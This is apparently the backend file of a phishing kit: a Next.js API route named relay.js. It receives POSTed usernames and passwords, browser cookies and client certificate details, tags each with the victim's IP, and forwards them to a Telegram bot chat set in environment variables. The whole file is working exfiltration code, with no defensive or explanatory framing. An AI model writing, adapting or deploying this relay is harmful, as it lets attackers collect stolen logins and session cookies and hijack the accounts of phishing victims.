// pages/api/relay.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  const payload = req.body;
  const ip      = payload.ip || 'unknown';

  // Telegram bot config (move to env!)
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId        = process.env.TELEGRAM_CHAT_ID;
  const apiUrl        = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

  let text;

  // 1) Credentials
  if (payload.type === 'creds') {
    text = `🔑 Credentials from ${ip}:\nUser: ${payload.user}\nPass: ${payload.pass}`;
  }
  // 2) Cookies
  else if (payload.type === 'cookies') {
    text = `🍪 Cookies from ${ip}:\n` +
           payload.cookies.map(c => `• ${c}`).join("\n");
  }
  // 3) Cert
  else if (payload.type === 'cert') {
    text =
      `🎫 Client Cert from ${ip}:\n` +
      `• Subject: ${payload.subject}\n` +
      `• Issuer: ${payload.issuer}\n` +
      `• Fingerprint: ${payload.fingerprint}`;
  }
  else {
    console.warn("relay.js: unknown payload:", payload);
    return res.status(400).json({ success: false, message: 'Bad payload' });
  }

  // send to Telegram
  try {
    const tgRes = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    if (!tgRes.ok) {
      const errText = await tgRes.text();
      console.error("Telegram API error:", errText);
      return res.status(502).json({ success: false, message: 'Telegram API error', details: errText });
    }
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("relay.js error:", err);
    return res.status(500).json({ success: false, message: 'Internal Error', error: err.message });
  }
}
